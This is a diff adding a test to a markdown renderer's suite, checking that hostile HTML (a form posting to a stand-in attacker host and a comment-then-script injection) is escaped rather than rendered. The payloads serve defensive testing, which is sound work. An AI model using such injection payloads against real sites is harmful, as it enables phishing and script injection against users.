@@ -242,3 +242,19 @@ test('nothing empty is wrapped in a paragraph of its own', () => {
     assert.doesNotMatch(renderAnswer(markdown), /<p>\s*<\/p>/, `an empty paragraph came out of: ${markdown}`);
   }
 });
+
+test('a form, an input and a comment that tries to swallow the page are all just text', () => {
+  // Carried across from a parallel implementation of this plan (closed as a duplicate of the branch
+  // that shipped): its hostile file had two cases mine did not. A form posting somewhere is the one
+  // shape that could ask a person for something and send it away, and an HTML comment is the classic
+  // way to try to swallow the markup that follows it.
+  for (const attack of [
+    '<form action="https://evil.example"><input name="p"></form>',
+    '<!-- --><script>alert(1)</script>',
+  ]) {
+    const html = renderAnswer(`${attack}\n`);
+
+    assertOnlyAllowedTags(html, attack);
+    assert.match(html, /&lt;/, `this was silently dropped instead of shown: ${attack}`);
+  }
+});
